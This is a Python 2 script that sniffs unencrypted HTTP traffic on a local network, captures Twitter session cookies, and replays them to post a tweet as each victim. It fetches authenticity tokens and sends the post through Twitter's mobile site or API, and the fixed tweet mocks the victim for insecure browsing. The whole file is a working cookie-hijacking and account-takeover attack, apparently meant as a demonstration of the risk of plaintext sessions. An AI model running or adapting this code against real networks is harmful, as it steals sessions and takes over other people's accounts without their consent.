#!/usr/bin/env python
import getopt, sys, pcap, dpkt, re, httplib, urllib

status = 'I browsed twitter insecurely on a public network and all I got was this lousy tweet. http://jonty.co.uk/idiocy-what'

def usage(): 
    print >>sys.stderr, 'Usage: %s [-i device]' % sys.argv[0] 
    sys.exit(1)

def main():

    opts, args = getopt.getopt(sys.argv[1:], 'i:h')
    device = None
    for o, a in opts:
        if o == '-i':
            name = a
        else:
            usage()

    cap = pcap.pcap(device)
    cap.setfilter('dst port 80')

    processed = {}

    for ts, raw in cap:
        eth = dpkt.ethernet.Ethernet(raw)

        # Depending on platform, we can either get fully formed packets or unclassified radio data
        if isinstance(eth.data, str):
            data = eth.data
        else:
            data = eth.data.data.data

        hostMatches = re.search('Host: ((?:api|mobile|www)?\.?twitter\.com)', data)
        if hostMatches:

            host = hostMatches.group(1)

            cookieMatches = re.search('Cookie: ([^\n]+)', data)
            if not cookieMatches:
                continue

            cookie = cookieMatches.group(1)

            headers = {
                "User-Agent": "Mozilla/5.0",
                "Cookie": cookie,
            }
            
            conn = httplib.HTTPSConnection(host)
            conn.request("GET", "/", None, headers)
            response = conn.getresponse()
            page = response.read()

            # Newtwitter and Oldtwitter have different formatting, so be lax
            authToken = ''

            formMatches = re.search("<.*?authenticity_token.*?>", page, 0)
            if formMatches:
                authMatches = re.search("value=[\"'](.*?)[\"']", formMatches.group(0))

                if authMatches:
                    authToken = authMatches.group(1)

            nameMatches = re.search('"screen_name":"(.*?)"', page, 0)
            if not nameMatches:
                nameMatches = re.search('content="(.*?)" name="session-user-screen_name"', page, 0)

            name = ''
            if nameMatches:
                name = nameMatches.group(1)


            # We don't want to repeatedly spam people
            if (not name and host != 'mobile.twitter.com') or name in processed:
                continue


            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json, text/javascript, */*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "X-PHX": "true",
                "Referer": "http://api.twitter.com/p_receiver.html",
                "Cookie": cookie
            }

            if host == 'mobile.twitter.com':

                params = urllib.urlencode({
                    'tweet[text]': status,
                    'authenticity_token': authToken
                })

                conn = httplib.HTTPConnection("mobile.twitter.com")
                conn.request("POST", "/", params, headers)

            else:

                params = urllib.urlencode({
                    'status': status,
                    'post_authenticity_token': authToken
                })

                conn = httplib.HTTPConnection("api.twitter.com")
                conn.request("POST", "/1/statuses/update.json", params, headers)


            response = conn.getresponse()
            if response.status == 200 or response.status == 302 or response.status == 403:

                if name:
                    processed[name] = 1

                # 403 is a dupe tweet
                if response.status != 403:
                    print "Successfully tweeted as %s" % name

            else:

                print "FAILED to tweet as %s, debug follows:" % name
                print response.status, response.reason
                print response.read() + "\n"


if __name__ == '__main__':
    main()
